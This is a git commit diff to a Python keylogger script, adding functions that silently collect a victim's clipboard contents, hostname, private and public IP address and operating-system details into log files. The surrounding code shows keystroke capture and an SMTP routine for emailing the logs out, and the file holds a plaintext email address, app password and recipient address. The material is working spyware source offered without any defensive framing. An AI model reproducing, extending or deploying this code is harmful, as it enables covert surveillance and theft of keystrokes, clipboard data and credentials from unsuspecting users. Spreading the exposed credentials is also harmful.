6f8a83ec5c1a54928a6c5619e4ecd43ae862cdc9
razvanrmn <razvanrmn@icloud.com>
2024-03-22 12:32:59 +0200

    clipboard and sys information

--- Project/keylogger.py
+++ Project/keylogger.py
@@ -28,6 +28,7 @@ from PIL import ImageGrab
 
 keys_information = "key_log.txt"
 system_information = "system_information.txt"
+clipboard_information = "clipboard_information.txt"
 email_address = "romanrtera@gmail.com"
 password = "wjrx pxld iyqu lvec"
 to_addr = "boglarka_m@yahoo.com"
@@ -60,18 +61,44 @@ def send_email(filename, attachment, to_addr):
     s.sendmail(from_addr, to_addr, text)
     s.quit()
 
-#send_email(keys_information, file_path + extend + keys_information, to_addr)
+
+# send_email(keys_information, file_path + extend + keys_information, to_addr)
 
 def computer_information():
     with open(file_path + extend + system_information, "a") as f:
         hostname = socket.gethostname()
-        IPaddr = socket.gethostbyname(hostname)
+        ip_addr = socket.gethostbyname(hostname)
         try:
             public_ip = get('https://api.ipify.org').text
-            f.write("Public IP Address:" + public_ip)
+            f.write("Public IP Address:" + public_ip + '\n')
         except Exception:
-            f.write("Couldn't get Public IP Address (most likely max query)")
+            f.write("Couldn't get Public IP Address (most likely max query)\n")
         f.write("Processor: " + (platform.platform() + '\n'))
+        f.write("System: " + platform.system() + " " + platform.release() + '\n')
+        f.write("Machine: " + platform.machine() + '\n')
+        f.write("Hostname: " + hostname + '\n')
+        f.write("Private IP Address: " + ip_addr + '\n')
+
+
+computer_information()
+
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could no be copied")
+
+
+copy_clipboard()
+
+
 def on_press(key):
     global keys, count
     print(key)
